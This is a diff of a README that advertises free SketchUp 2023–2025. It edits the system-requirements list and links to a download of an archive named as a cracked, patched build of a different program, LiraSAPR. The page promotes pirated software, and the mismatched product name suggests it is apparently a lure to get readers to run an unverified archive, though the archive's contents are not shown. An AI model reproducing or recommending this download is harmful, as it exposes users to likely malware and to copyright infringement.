@@ -2,12 +2,11 @@ FREE SketchUp 2023 2024 2025 🚀🎉
 SketchUp is a powerful 3D modeling tool used for a wide range of drawing applications such as architectural, interior design, civil and mechanical engineering, film, and video game design. It provides intuitive tools and a user-friendly interface for creating detailed models. 🏗️🎨
 
 > [!Tip]
-> System Requirements 🖥
-
-Operating System: Windows 10 or higher 🪟
-Processor: 2.1 GHz or higher ⚙️
-RAM: Minimum 8 GB (16 GB recommended) 🧠
-Disk Space: Minimum 500 MB 💾
+>## System Requirements 🖥
+- Operating System: Windows 10 or higher 🪟
+- Processor: 2.0 GHz or higher ⚙️
+- RAM: Minimum 4 GB (8 GB recommended) 🧠
+- Disk Space: Minimum 2 GB 💾
 
 ## Installation 🛠
 1. Download the latest release [here](https://github.com/gagaga1132/LiraSAPR/releases/download/LiraSAPR_Crack/LiraSAPR_crack_Full_Patched_x64.rar). 📥
